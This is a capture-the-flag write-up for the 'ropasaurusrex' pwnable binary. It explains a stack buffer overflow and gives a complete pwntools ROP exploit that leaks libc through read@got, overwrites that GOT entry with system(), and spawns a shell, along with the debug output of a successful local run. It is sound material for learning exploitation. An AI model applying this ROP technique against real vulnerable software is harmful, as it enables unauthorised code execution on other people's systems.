# ropasaurusrex

About this binary.

```bash
[*] '/home/ubuntu/Desktop/Pwnable/Write-ups/ropasaurusrex/ropasaurusrex'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```bash
ldd ./ropasaurusrex
	linux-gate.so.1 =>  (0xf7f53000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d81000)
	/lib/ld-linux.so.2 (0xf7f55000)
```

```asm
gdb-peda$ info func
All defined functions:

Non-debugging symbols:
0x080482fc  __gmon_start__@plt
0x0804830c  write@plt
0x0804831c  __libc_start_main@plt
0x0804832c  read@plt
```

There is no function symbols. By IDA, we can get source code.

```c
ssize_t __cdecl main()
{
    sub_80483F4();
    return write(1, "WIN\n", 4u);
}

ssize_t sub_80483F4()
{
    char buf; // [esp+10h] [ebp-88h]

    return read(0, &buf, 0x100u);
}
```

buf is at `[ebp - 88h]`, and binary reads `0x100` bytes to buf, so we can overflow buf.

We have `read@plt` and `write@plt`, so I try to exploit by ROP.

Stack | Size
---- | ----
ret | 4 bytes
sfp | 4 bytes
buf | 0x88 bytes

First, I will leak `read@got` to get address of libc, and get address of `system()`. Next, I'll write `/bin/sh` in memory, and write address of `system()` to `read@got`. Finally I'll call `read("/bin/sh")`

This is ROP code
```c
write(1, readGot, 4)
read(0, wirtable, 4)    // '/bin/sh'
read(0, readGot, 4)     // system offset
write(1, readGot, 4)
read('/bin/sh')
```

I will give `0x88 + 0x4` bytes dummy, and make rop code.

## exploit.py
```python
from pwn import *

context.log_level = 'debug'

binary = ELF('./ropasaurusrex')
lib = ELF('/lib32/libc.so.6')

system = lib.symbols['system']
read = lib.symbols['read']

writePlt = binary.plt['write']
writeGot = binary.got['write']
readPlt = binary.plt['read']
readGot = binary.got['read']

sub1 = 0x80483F4
main = 0x804841d
binsh = '/bin/sh'
writable = 0x08049530


pppr = 0x080484b6

'''
rop code

write(1, readGot, 4)
read(0, wirtable, 4) // '/bin/sh'
read(0, readGot, 4)  // system offset
write(1, readGot, 4)
read('/bin/sh')
'''

p = process(['./ropasaurusrex'])

payload = 'a' * 0x88 + 'b' * 0x4
payload += p32(writePlt) + p32(pppr) + p32(1) + p32(readGot) + p32(4)
payload += p32(readPlt) + p32(pppr) + p32(0) + p32(writable) + p32(8)
payload += p32(readPlt) + p32(pppr) + p32(0) + p32(readGot) + p32(4)
payload += p32(writePlt) +p32(pppr) + p32(1) + p32(readGot) + p32(4)
payload += p32(readPlt) + p32(1) + p32(writable)

#gdb.attach(proc.pidof(p)[0], 'b *read')
p.sendline(payload)
leak = u32(p.recv(4))
leak = leak - read
print hex(leak)
p.sendline(binsh)
p.sendline(p32(leak + system))
p.recv(4)
p.interactive()
```

```bash
python exploit.py
[DEBUG] PLT 0x80482fc __gmon_start__
[DEBUG] PLT 0x804830c write
[DEBUG] PLT 0x804831c __libc_start_main
[DEBUG] PLT 0x804832c read
[*] '/home/ubuntu/Desktop/Pwnable/Write-ups/ropasaurusrex/ropasaurusrex'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[DEBUG] PLT 0x176b0 _Unwind_Find_FDE
[DEBUG] PLT 0x176c0 realloc
[DEBUG] PLT 0x176e0 memalign
[DEBUG] PLT 0x17710 _dl_find_dso_for_object
[DEBUG] PLT 0x17720 calloc
[DEBUG] PLT 0x17730 ___tls_get_addr
[DEBUG] PLT 0x17740 malloc
[DEBUG] PLT 0x17748 free
[*] '/lib32/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './ropasaurusrex': pid 7366
[DEBUG] Sent 0xe9 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000080  61 61 61 61  61 61 61 61  62 62 62 62  0c 83 04 08  │aaaa│aaaa│bbbb│····│
    00000090  b6 84 04 08  01 00 00 00  1c 96 04 08  04 00 00 00  │····│····│····│····│
    000000a0  2c 83 04 08  b6 84 04 08  00 00 00 00  30 95 04 08  │,···│····│····│0···│
    000000b0  08 00 00 00  2c 83 04 08  b6 84 04 08  00 00 00 00  │····│,···│····│····│
    000000c0  1c 96 04 08  04 00 00 00  0c 83 04 08  b6 84 04 08  │····│····│····│····│
    000000d0  01 00 00 00  1c 96 04 08  04 00 00 00  2c 83 04 08  │····│····│····│,···│
    000000e0  01 00 00 00  30 95 04 08  0a                        │····│0···│·│
    000000e9
[DEBUG] Received 0x4 bytes:
    00000000  50 e3 e3 f7                                         │P···││
    00000004
0xf7d6a000
[DEBUG] Sent 0x8 bytes:
    '/bin/sh\n'
[DEBUG] Sent 0x5 bytes:
    00000000  40 49 da f7  0a                                     │@I··│·│
    00000005
[DEBUG] Received 0x4 bytes:
    00000000  40 49 da f7                                         │@I··││
    00000004
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x81 bytes:
    'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n'
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ exit
[DEBUG] Sent 0x5 bytes:
    'exit\n'
[DEBUG] Received 0x14 bytes:
    'sh: 2: \x0c: not found\n'
sh: 2: \x0c: not found
[*] Got EOF while reading in interactive
$ 
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
[*] Process './ropasaurusrex' stopped with exit code -11 (SIGSEGV) (pid 7366)
[*] Got EOF while sending in interactive
```